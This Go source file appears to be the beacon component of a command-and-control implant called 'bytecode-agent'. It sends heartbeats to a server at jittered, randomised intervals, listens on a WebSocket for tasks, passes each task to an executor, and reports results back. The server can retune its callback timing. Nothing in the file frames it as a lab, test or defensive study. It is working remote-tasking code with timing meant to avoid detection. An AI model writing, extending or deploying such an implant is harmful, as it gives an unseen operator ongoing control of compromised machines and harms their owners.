package beacon

import (
	"encoding/json"
	"fmt"
	"log"
	"math/rand"
	"strings"
	"time"

	"bytecode-agent/internal/comms"
	"bytecode-agent/internal/config"
	"bytecode-agent/internal/executor"
)

// Loop runs the main beacon loop forever
// Loop runs the main beacon loop forever
func Loop(client *comms.Client, wsClient *comms.WSClient, cfg *config.Config) error {
	log.Println("[BEACON] Starting beacon loop...")
	log.Printf("[BEACON] Interval: %d-%ds (jitter)\n", cfg.BeaconMin, cfg.BeaconMax)

	// Start WebSocket connection in background
	go func() {
		for {
			err := wsClient.Connect()
			if err == nil {
				// Wait for connection to close
				for {
					if wsClient.Conn == nil {
						break
					}
					time.Sleep(5 * time.Second)
				}
			}
			log.Printf("[WS] Disconnected, retrying in 10s...\n")
			time.Sleep(10 * time.Second)
		}
	}()

	// Perform initial beacon immediately
	log.Println("[BEACON] Performing initial heartbeat...")
	if _, err := client.Beacon(); err != nil {
		log.Printf("[BEACON] Initial heartbeat failed: %v\n", err)
		return err
	}

	for {
		// Calculate next sleep
		sleepDuration := randomInterval(cfg.BeaconMin, cfg.BeaconMax)
		log.Printf("[BEACON] Next heartbeat in %ds...\n", int(sleepDuration.Seconds()))
		
		timer := time.NewTimer(sleepDuration)

		select {
		case <-timer.C:
			// Regular beacon
			log.Println("[BEACON] Sending heartbeat...")
			resp, err := client.Beacon()
			if err != nil {
				log.Printf("[BEACON] Error: %v\n", err)
				if strings.Contains(err.Error(), "HTTP 403") {
					return fmt.Errorf("identity invalid (403): %w", err)
				}
				continue
			}

			if resp.Task != nil {
				processTask(resp.Task, client, cfg)
			}

		case task := <-wsClient.TaskChan:
			// Real-time task via WebSocket
			log.Printf("[WS] Processing real-time task: %s\n", task.ID[:8])
			processTask(task, client, cfg)
		}
	}
}

// processTask handles task execution and result reporting
func processTask(task *comms.TaskPayload, client *comms.Client, cfg *config.Config) {
	log.Printf("[TASK] Received: type=%s id=%s\n", task.Type, task.ID[:8])

	// Handle sleep_update specially
	if task.Type == "sleep_update" {
		handleSleepUpdate(task, cfg)
	}

	// Execute the task
	result := executor.Execute(task, client.APIKey)
	log.Printf("[TASK] Completed: status=%s\n", result.Status)

	// Send result back
	if err := client.SendResult(result); err != nil {
		log.Printf("[RESULT] Failed to send: %v\n", err)
	} else {
		log.Println("[RESULT] Sent successfully")
	}
}


// handleSleepUpdate updates the beacon interval from a task payload
func handleSleepUpdate(task *comms.TaskPayload, cfg *config.Config) {
	payloadBytes, err := json.Marshal(task.Payload)
	if err != nil {
		return
	}

	var payload map[string]interface{}
	if err := json.Unmarshal(payloadBytes, &payload); err != nil {
		return
	}

	if interval, ok := payload["interval"].(float64); ok {
		newInterval := int(interval)
		if newInterval > 0 {
			cfg.BeaconMin = newInterval
			cfg.BeaconMax = newInterval + (newInterval / 3) // 33% jitter
			log.Printf("[CONFIG] Beacon interval updated: %d-%ds\n", cfg.BeaconMin, cfg.BeaconMax)
		}
	}
}

// randomInterval returns a random duration between min and max seconds
func randomInterval(min, max int) time.Duration {
	if min >= max {
		return time.Duration(min) * time.Second
	}
	n := min + rand.Intn(max-min)
	return time.Duration(n) * time.Second
}

// FormatDuration formats a duration for logging
func FormatDuration(d time.Duration) string {
	return fmt.Sprintf("%.1fs", d.Seconds())
}
